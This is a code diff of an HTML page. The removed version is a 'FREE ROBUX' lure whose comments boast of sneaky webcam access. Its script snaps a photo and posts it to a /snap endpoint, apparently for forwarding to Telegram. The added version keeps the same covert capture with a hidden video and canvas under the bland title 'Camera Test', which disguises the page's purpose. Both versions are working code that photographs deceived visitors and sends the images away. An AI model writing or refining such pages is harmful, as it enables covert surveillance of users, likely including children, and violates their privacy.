@@ -1,32 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>👉 FREE ROBUX 👈</title> <!-- Lure them in 🤡 -->
+    <title>Camera Test</title>
 </head>
 <body>
-    <h1>Click "Accept" for free Robux! (Enable camera first!)</h1>
-    <button onclick="stealPhoto()">ACCEPT</button>
 
-    <script>
-        // Sneaky webcam access 🎥
-        async function stealPhoto() {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const track = stream.getVideoTracks()[0];
-            const imageCapture = new ImageCapture(track);
-            const blob = await imageCapture.takePhoto();
-            
-            // Convert to base64 for Telegram 🚀
-            const reader = new FileReader();
-            reader.onloadend = () => {
-                fetch('/snap', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ image: reader.result }),
-                });
-            };
-            reader.readAsDataURL(blob);
-            track.stop(); // Screw them 😂
-        }
-    </script>
+<h2>Click Accept to enable camera</h2>
+<button id="btn">ACCEPT</button>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+document.getElementById("btn").onclick = async () => {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        await new Promise(r => setTimeout(r, 800)); // wait camera warmup
+
+        const canvas = document.getElementById("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0);
+
+        const imageBase64 = canvas.toDataURL("image/png");
+
+        stream.getTracks().forEach(t => t.stop());
+
+        await fetch("/snap", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ image: imageBase64 })
+        });
+
+        alert("Done");
+
+    } catch (e) {
+        alert("Camera access denied");
+        console.error(e);
+    }
+};
+</script>
+
 </body>
 </html>
